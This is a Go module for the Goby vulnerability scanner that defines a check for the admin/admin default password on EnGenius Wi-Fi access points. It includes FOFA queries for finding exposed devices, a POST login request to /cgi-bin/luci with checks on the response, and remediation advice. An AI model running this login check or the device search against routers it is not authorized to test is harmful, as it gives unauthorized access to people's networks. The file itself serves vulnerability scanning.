package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "EnGenius-wifi Default Password",
    "Description": "<p>EnGenius - Multiple Home Router Access Points provide powerful connectivity for large homes and small businesses. Operates as a standalone AP or as part of a Neutron network management solution. Create a stable, secure wireless network, even with limited IT support and budget. Its low-profile in-ceiling design complements interior décor.The router interface has a default identity of admin/admin.</p>",
    "Product": "EnGenius-Wifi",
    "Homepage": "https://www.engeniustech.com/engenius-products/managed-indoor-wireless-ews300ap/#",
    "DisclosureDate": "2022-11-17",
    "Author": "wmqfree@163.com",
    "FofaQuery": "body=\"style=\\\"background: url(/pictures/img_bg_horizon.png) repeat-x\\\"\"",
    "GobyQuery": "body=\"style=\\\"background: url(/pictures/img_bg_horizon.png) repeat-x\\\"\"",
    "Level": "1",
    "Impact": "<p>EnGenius-wifi has a default password. An attacker can use the default password without authorization. admin/admin can log in to the system background to perform other sensitive operations and obtain more sensitive information.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /cgi-bin/luci/;stok",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: sysauth",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/luci",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "username=admin&password=admin"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Location: /cgi-bin/luci/;stok",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Set-Cookie: sysauth",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|define|text|admin:admin"
            ]
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5",
    "Translation": {
        "CN": {
            "Name": "EnGenius-wifi默认口令",
            "Product": "EnGenius-Wifi",
            "Description": "<p>EnGenius-多款家庭路由器接入点为大型家庭和小型企业提供强大的连接。作为独立 AP 或作为 Neutron 网络管理解决方案的一部分运行。创建稳定、安全的无线网络，即使 IT 支持和预算有限。其低调的吸顶式设计与室内装饰相得益彰。</p><p>路由器web界面存在默认口令admin/admin。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位数。<br></p><p>2、如非必要，禁止公网访问该管理系统。</p>",
            "Impact": "<p>EnGenius-wifi存在默认口令，攻击者可未授权使用默认口令admin/admin登录系统后台，执行其他敏感操作，获取更多敏感信息。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "EnGenius-wifi Default Password",
            "Product": "EnGenius-Wifi",
            "Description": "<p>EnGenius - Multiple Home Router Access Points provide powerful connectivity for large homes and small businesses. Operates as a standalone AP or as part of a Neutron network management solution. Create a stable, secure wireless network, even with limited IT support and budget. Its low-profile in-ceiling design complements interior décor.The router interface has a default identity of admin/admin.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the management system from the public network.</p>",
            "Impact": "<p>EnGenius-wifi has a default password. An attacker can use the default password without authorization. admin/admin can log in to the system background to perform other sensitive operations and obtain more sensitive information.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
